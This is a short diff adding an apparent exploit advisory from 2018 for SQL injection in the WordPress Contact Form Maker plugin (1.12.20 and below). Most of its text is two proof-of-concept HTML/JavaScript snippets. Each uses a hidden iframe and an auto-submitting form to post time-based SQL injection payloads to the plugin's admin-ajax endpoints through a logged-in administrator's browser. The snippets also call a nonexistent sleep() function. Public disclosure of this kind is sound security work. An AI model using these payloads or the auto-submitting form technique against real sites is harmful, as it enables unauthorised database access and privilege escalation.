@@ -1,0 +1,39 @@
+# Title: WordPress Contact Form Maker Plugin 1.12.20 - SQL Injection
+# Date: 2018-06-07
+# Author: Neven Biruski
+# Software: WordPress Contact Form Maker plugin
+# Software link: https://wordpress.org/plugins/contact-form-maker/
+# Version: 1.12.20 and below
+
+# The easiest way to reproduce the SQL injection vulnerabilities is to
+# open the presented HTML/JavaScript snippet in your browser while being
+# logged in as administrator or another user that is authorized to
+# access the plugin settings page. Users that do not have full
+# administrative privileges could abuse the database access the
+# vulnerabilities provide to either escalate their privileges or obtain
+# and modify database contents they were not supposed to be able to.
+
+
+# PoC 1
+
+<iframe style="display:none" name="invisible"></iframe>
+<form id="form" method="POST" action="http://vulnerablesite.com/wp-admin/admin-ajax.php?action=FormMakerSQLMapping_fmc&task=db_table_struct"
+target="invisible">
+<input type="hidden" name="name" value="wp_users WHERE 42=42 AND SLEEP(42)--;"/>
+</form>
+<script>
+ document.getElementById("form").submit();
+ sleep(3000);
+</script>
+
+# PoC 2
+
+<iframe style="display:none" name="invisible"></iframe>
+<form id="form" method="POST" action="http://vulnerablesite.com/wp-admin/admin-ajax.php?form_id=1&send_header=0&action=generete_csv_fmc&limitstart=0"
+target="invisible">
+<input type="hidden" name="search_labels" value="(SELECT * FROM (SELECT(SLEEP(42)))XXX)"/>
+</form>
+<script>
+ document.getElementById("form").submit();
+ sleep(3000);
+</script>
